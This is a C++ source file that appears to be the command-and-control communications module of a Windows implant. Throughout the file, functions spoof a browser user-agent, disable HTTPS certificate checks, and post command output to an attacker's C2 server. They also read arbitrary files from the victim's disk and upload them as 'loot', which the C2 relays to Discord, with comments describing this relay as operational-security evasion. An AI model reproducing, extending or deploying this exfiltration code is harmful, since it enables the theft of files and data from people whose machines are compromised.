#include "comms.h"
#include "config.h"
#include "utils.h"
#include <windows.h>
#include <winhttp.h>
#include <vector>
#include <fstream>
#include <cstdio>

// ===================== WinHTTP Helpers =====================

static HINTERNET g_session = nullptr;

static void init_session() {
    if (!g_session) {
        g_session = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME,
                                WINHTTP_NO_PROXY_BYPASS, 0);
    }
}

// Generic HTTP request to C2 server
static std::string winhttp_request(const wchar_t* method, const wchar_t* host, int port,
                                    const std::wstring& path, const std::string& body,
                                    bool use_https) {
    init_session();
    if (!g_session) return "";
    
    HINTERNET hConnect = WinHttpConnect(g_session, host, port, 0);
    if (!hConnect) return "";
    
    DWORD flags = use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method, path.c_str(),
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return ""; }
    
    // For HTTPS, ignore certificate errors (self-signed / Discord)
    if (use_https) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    }
    
    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL sent = WinHttpSendRequest(hRequest, headers, -1,
                                    (LPVOID)body.c_str(), (DWORD)body.length(),
                                    (DWORD)body.length(), 0);
    
    std::string response;
    if (sent && WinHttpReceiveResponse(hRequest, nullptr)) {
        char buf[4096];
        DWORD bytesRead = 0;
        while (WinHttpReadData(hRequest, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
            response.append(buf, bytesRead);
            bytesRead = 0;
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return response;
}

// ===================== C2 Communication =====================

std::string http_post_json(const std::string& path, const std::string& json_body) {
    return winhttp_request(L"POST", C2_HOST, C2_PORT, to_wide(path), json_body, false);
}

std::string http_get(const std::string& path) {
    return winhttp_request(L"GET", C2_HOST, C2_PORT, to_wide(path), "", false);
}

// ===================== Webhook Proxy (OPSEC: via C2 only) =====================

bool discord_send(const std::string& text_content) {
    // OPSEC: Route through C2 webhook proxy instead of contacting Discord directly
    // C2 server will forward to Discord on our behalf
    std::string body = "{\"cmd_id\":\"cpp\",\"output\":\"" + json_escape(text_content) + "\",\"command\":\"implant_report\"}";
    std::string resp = http_post_json("/report/cpp-implant", body);
    return true;
}

bool discord_upload_file(const std::string& filepath, const std::string& message) {
    // OPSEC: Upload to C2 /loot/ endpoint which proxies to Discord
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) return false;
    std::vector<char> file_data((std::istreambuf_iterator<char>(file)),
                                 std::istreambuf_iterator<char>());
    file.close();
    
    std::string filename = filepath;
    size_t pos = filename.find_last_of("\\/");
    if (pos != std::string::npos) filename = filename.substr(pos + 1);
    
    // Build multipart/form-data for C2
    std::string boundary = "----FsocietyBoundary9876543210";
    std::string body;
    
    // Message part
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"message\"\r\n\r\n";
    body += message + "\r\n";
    
    // File part
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append(file_data.begin(), file_data.end());
    body += "\r\n--" + boundary + "--\r\n";
    
    // Send to C2 (not Discord)
    init_session();
    if (!g_session) return false;
    
    HINTERNET hConnect = WinHttpConnect(g_session, C2_HOST, C2_PORT, 0);
    if (!hConnect) return false;
    
    std::wstring loot_path = to_wide("/loot/cpp-implant");
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", loot_path.c_str(),
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return false; }
    
    std::wstring content_type = L"Content-Type: multipart/form-data; boundary=" + to_wide(boundary) + L"\r\n";
    
    BOOL sent = WinHttpSendRequest(hRequest, content_type.c_str(), -1,
                                    (LPVOID)body.c_str(), (DWORD)body.length(),
                                    (DWORD)body.length(), 0);
    
    bool ok = sent && WinHttpReceiveResponse(hRequest, nullptr);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return ok;
}
